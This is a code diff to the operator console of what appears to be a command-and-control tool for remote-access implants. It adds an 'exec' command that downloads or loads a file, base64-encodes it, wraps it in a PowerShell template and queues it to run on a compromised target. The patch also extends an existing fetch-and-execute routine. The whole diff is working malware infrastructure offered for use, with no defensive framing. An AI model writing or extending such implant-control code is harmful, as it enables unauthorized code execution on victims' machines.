@@ -4,6 +4,7 @@
 """
 import os
 import time
+import base64
 from core.ui import UI
 from core.utils import Utils
 from core.log import Log
@@ -26,6 +27,7 @@ class Cli:
         self.shell_cmds["upload"] = self.upload_file
         self.shell_cmds["delay"] = self.update_delay
         self.shell_cmds["refresh"] = self.refresh
+        self.shell_cmds["exec"] = self.exec_code
 
         self.config = config
         self.db = self.config.get("redis")
@@ -59,9 +61,9 @@ class Cli:
                     callback = self.shell_cmds[cmd]
                     data = callback(data)
 
-                self.db.push_cmd(self.guid, data)
-                
-                self.get_cmd_output()
+                if not cmd == "help":
+                    self.db.push_cmd(self.guid, data)
+                    self.get_cmd_output()
                 
         # interacting with the main console
         else:
@@ -163,11 +165,15 @@ class Cli:
         else:
             data = Utils.download_url(path)
             
-        UI.success("Fetching %s" % path)
-        UI.success("Executing %s" % ps)
+        if not data == ";":
+            UI.success("Fetching %s" % path)
+            UI.success("Executing %s" % ps)
         
-        return "%s;%s" % (data, ps)
-    
+            return "%s;%s" % (data, ps)
+        else:
+            UI.error("Cannot fetch the resource")
+            return data
+        
     def read_file(self, data):
         try:
             cmd, path = data.split(" ", 2)
@@ -178,6 +184,31 @@ class Cli:
         
     def upload_file(self, data):
         pass
+    
+    def exec_code(self, data):
+        try:
+            cmd, path = data.split(" ", 1)
+        except:
+            UI.error("Missing arguments")
+            return ";"
+        
+        data = ";"
+        if Utils.file_exists(path, False, False):
+            data = Utils.load_file_unsafe(path)
+        else:
+            data = Utils.download_url(path)     
+            
+        if not data == ";":
+            UI.success("Fetching %s" % path)
+            
+            data = base64.b64encode(data)
+            ps = Utils.load_powershell_script("exec.ps1", 12)
+            ps = Utils.update_key(ps, "PAYLOAD", data)
+            UI.success("Payload should be executed shortly on the target")
+            return ps
+        else:
+            UI.error("Cannot fetch the resource")
+            return data
     
     def update_delay(self, data):
         delay = Utils.get_arg_at(data, 1, 2)
